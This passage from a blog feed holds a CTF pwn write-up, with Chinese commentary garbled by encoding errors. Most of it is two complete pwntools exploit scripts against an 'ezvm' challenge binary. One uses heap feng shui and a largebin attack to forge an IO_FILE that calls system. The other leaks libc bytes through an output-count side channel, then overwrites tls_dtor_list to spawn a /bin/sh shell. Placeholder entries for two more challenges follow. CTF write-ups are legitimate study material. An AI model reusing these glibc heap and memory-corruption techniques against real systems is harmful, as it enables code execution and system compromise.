class="hljs-number">3</span>) + mov(<span class="hljs-number">0</span>,Addr-main_arena_d96) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_heap_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">2</span>) + mov(<span class="hljs-number">0</span>,Addr-TARGET) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_chain</span>(<span class="hljs-params">start_idx,chain</span>):<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    idx = start_idx<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chain)):<br>        <span class="hljs-keyword">if</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x7000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt;= <span class="hljs-number">0x7fff</span>:<br>            code += write_libc_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x5000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt; <span class="hljs-number">0x7000</span>:<br>            code += write_heap_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            code += mov(<span class="hljs-number">0</span>,chain[i]) + store(<span class="hljs-number">0</span>,idx)<br>            idx += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">heap_spary</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    code = halt()<br>    run_vm(size,<span class="hljs-number">0x430</span>//<span class="hljs-number">8</span>,code)<br>    pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Heap Fengshui</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>):<br>    heap_spary(i*<span class="hljs-number">0x10</span>)<br>memory_addr = <span class="hljs-number">0x55555555a290</span> + <span class="hljs-number">0x10</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004e1</span>) <span class="hljs-comment"># 0x120+0x130+0x140+0x150+1</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a3a8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004f1</span>) <span class="hljs-comment"># Largebin little bigger than unsorted</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a4c8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x55555555a9e0</span> - <span class="hljs-number">0x55555555a9b0</span>+<span class="hljs-number">1</span>) <span class="hljs-comment"># Repair Heap</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a9b8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x108</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x120</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Largebin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x750000</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4e0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt() <br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x110</span>//<span class="hljs-number">8</span>,code) <br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Calculate to Largebin Attack _IO_list_all while makeing Fake_IO_FILE &lt; b *$rebase(0x2248) p *(struct _IO_FILE_plus *)0x55555555a4c0 &gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>memory_addr = <span class="hljs-number">0x55555555a3a0</span> + <span class="hljs-number">0x10</span><br>_IO_list_all = <span class="hljs-number">0x7ffff7fa6680</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>_IO_wfie_jumps = <span class="hljs-number">0x7ffff7fa20c0</span><br>chain = [TARGET,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,TARGET+<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>] + [<span class="hljs-number">0</span>]*(((<span class="hljs-number">0xd8</span>-<span class="hljs-number">0xc0</span>)//<span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) + [_IO_wfie_jumps+<span class="hljs-number">0x30</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x7ffff7ddcd60</span>,TARGET+<span class="hljs-number">0xd0</span>] <span class="hljs-comment"># _lock... _wide_data... system</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += load(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment"># 0x7ffff7fa5ce0 &lt;main_arena+96&gt;</span><br>code += load(<span class="hljs-number">2</span>,(TARGET + <span class="hljs-number">0x20</span> - memory_addr)//<span class="hljs-number">8</span>) <span class="hljs-comment"># (Victim&#x27;s Largebin -&gt; bk) -&gt; 0x55555555a4e0: 0x000055555555a4c0 &lt; - Largebin Addr</span><br>code += write_chain((TARGET + <span class="hljs-number">0x28</span> - memory_addr)//<span class="hljs-number">8</span>,[_IO_list_all-<span class="hljs-number">0x20</span>])<br>code += write_chain((TARGET + <span class="hljs-number">0x88</span> - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,code) <span class="hljs-comment"># 0x4e0 Unsortedbin </span><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Trigger Largebin Attack,repair FAKE_IO_FILE</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>chain = [<span class="hljs-number">0x6873</span>,<span class="hljs-number">0x4f1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>code = write_chain((TARGET - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4c8</span>//<span class="hljs-number">8</span>,code)<br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220921201658577.png" alt="exp"></p><h3 id="æ€è·¯äºŒ-Side-channel-leak"><a class="header-anchor" href="#æ€è·¯äºŒ-Side-channel-leak">Â¶</a>æ€è·¯äºŒ Side-channel leak</h3><p>èµ›åå­¦çš„æ€è·¯ï¼Œæ„Ÿè§‰å¾ˆå·§å¦™ï¼Œåˆ©ç”¨çš„æ˜¯è¾“å‡ºçš„å¤šå°‘è¡Œ <code>what</code> åæ¨å­—èŠ‚æ•°ï¼ŒğŸ‘´ğŸ» ä»¬tqlã€‚</p><p>è¿™ä¸ªè™šæ‹Ÿæœºç»™å‡ºçš„å‘½ä»¤å¾ˆå…¨ï¼Œå¯ä»¥å†™ä¸€ä¸ª <code>equal() jnz()</code> è¿™æ ·çš„å¾ªç¯æ¥ä¾§ä¿¡é“çˆ†ç ´å­—èŠ‚ï¼Œä»0å¼€å§‹çˆ†ç ´ï¼Œå¦‚æœç›¸ç­‰çš„è¯å°±è·³è½¬åˆ°ç»“æŸï¼Œå¦åˆ™è¾“å‡ºä¸€è¡ŒæŠ¥é”™ï¼Œæœ€åè®°å½•è¾“å‡ºçš„è¡Œæ•°å³å¯æ¨å‡ºè¯¥å­—èŠ‚ä¸ºå¤šå°‘ã€‚</p><p>Leak å‡ºæ¥åå¯ä»¥æ‰“ IOï¼Œæˆ‘è¿™é‡Œæ‰“çš„æ˜¯ <code>call_dtor_list</code>ï¼Œå·®åˆ«ä¸å¤§ã€‚</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_byte</span>(<span class="hljs-params">addr_offset,byte_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    payload = [<br>        load(<span class="hljs-number">0</span>,addr_offset),push(<span class="hljs-number">0</span>),<br>        mov(<span class="hljs-number">0</span>,byte_offset*<span class="hljs-number">8</span>),push(<span class="hljs-number">0</span>),rshift(),<br>        mov(<span class="hljs-number">0</span>,<span class="hljs-number">0xff</span>),push(<span class="hljs-number">0</span>),And(),pop(<span class="hljs-number">0</span>), <span class="hljs-comment"># Reg0 = real_byte</span><br>        mov(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),mov(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 for guess byte;Reg2 as tool-reg for += 1</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">0</span>),<br>        eq(),   <span class="hljs-comment"># While Reg1 != Reg0</span><br>        jnz(<span class="hljs-number">0x58</span>+<span class="hljs-number">3</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x42</span>), <span class="hljs-comment"># If Reg1 == Reg0, go RETURN (Debug to attain ip_offset)</span><br>        other(), <span class="hljs-comment"># Side-channel Leak --- each time puts a line of &quot;what???&quot;</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">2</span>),add(),pop(<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 += 1</span><br>        jmp((<span class="hljs-number">0x38</span>+<span class="hljs-number">4</span>-<span class="hljs-number">0x53</span>-<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffffffffffffffff</span>), <span class="hljs-comment"># continue</span><br>        halt() <span class="hljs-comment"># return</span><br>    ]<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_addr</span>(<span class="hljs-params">addr_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    addr = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;&#x27;</span>.join(leak_byte(addr_offset,<span class="hljs-number">8</span>-<span class="hljs-number">1</span>-i)))<br>        pc = <span class="hljs-number">0</span><br>        side_data = ru(<span class="hljs-string">&quot;finish&quot;</span>)<br>        leaked_byte = side_data.count(<span class="hljs-string">&quot;what???&quot;</span>)<br>        lg(<span class="hljs-string">&#x27;BYTE[%d]&#x27;</span>%(<span class="hljs-number">8</span> - <span class="hljs-number">1</span> -i),leaked_byte)<br>        addr &lt;&lt;= <span class="hljs-number">8</span><br>        addr += leaked_byte<br>    <span class="hljs-keyword">return</span> addr<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do Leak</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x3000</span>//<span class="hljs-number">8</span>,halt())<br>libc_leak = leak_addr(<span class="hljs-number">0</span>)<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do OOB Write</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>fskey = -<span class="hljs-number">0x2890</span> + libc_base<br>tls_dtor_list = -<span class="hljs-number">0x2918</span> + libc_base<br>memory = -<span class="hljs-number">0x25ff0</span> +libc_base <br>code = mov(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,(fskey-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># fskey = 0</span><br>code += mov(<span class="hljs-number">0</span>,tls_dtor_list+<span class="hljs-number">8</span>) + store(<span class="hljs-number">0</span>,(tls_dtor_list-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># tls_dtor_list = &amp;tls_dtor_list + 8</span><br>code += mov(<span class="hljs-number">0</span>,rol(system_addr,<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">8</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 8) = rol(__libc_system,0x11,64)  # RIP</span><br>code += mov(<span class="hljs-number">0</span>,bin_sh) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">0x10</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 0x10) = rol(__libc_system,0x11,64) # RDI</span><br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x22000</span>//<span class="hljs-number">8</span>,code)<br><br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babysnitch-10-Solved-Workingâ€¦"><a class="header-anchor" href="#babysnitch-10-Solved-Workingâ€¦">Â¶</a>babysnitch (10 Solved)(Workingâ€¦)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162517106.png" alt="babysnitch"></p><h3 id="é¢˜ç›®æè¿°-v3"><a class="header-anchor" href="#é¢˜ç›®æè¿°-v3">Â¶</a>é¢˜ç›®æè¿°</h3><p>I have my application firewall installed. It should protect my flag even against RCE. Isnâ€™t It?</p><p><a href="https://drive.google.com/file/d/1A-isglKqxCjePSDtRMTN0mJ2ep8NTyC6/view?usp=sharing">attachment</a></p><h3 id="é¢˜ç›®åˆ†æ-v2"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v2">Â¶</a>é¢˜ç›®åˆ†æ</h3><h2 id="qqbot-3-Solved-Workingâ€¦"><a class="header-anchor" href="#qqbot-3-Solved-Workingâ€¦">Â¶</a>qqbot (3 Solved)(Workingâ€¦)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162924198.png" alt="qqbot"></p><h3 id="é¢˜ç›®æè¿°-v4"><a class="header-anchor" href="#é¢˜ç›®æè¿°-v4">Â¶</a>é¢˜ç›®æè¿°</h3><p>We prepare some bots for you, fool one of them and get flag. + qqbot01@localhost + qqbot02@localhost + qqbot03@localhost + qqbot04@localhost + qqbot05@localhost The bot is on ubuntu 20.04 and flag in <code>/flag</code></p><p><a href="https://drive.google.com/file/d/1eBb4Cmm-dVQ4Z914hzICthOH8iMjedp_/view?usp=sharing">attachment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 å¼ºç½‘æ¯åˆèµ› Pwn éƒ¨åˆ†é¢˜è§£</title>
    <link href="/posts/cfd0f35d.html"/>
    <url>/posts/cfd0f35d.html</url>
    
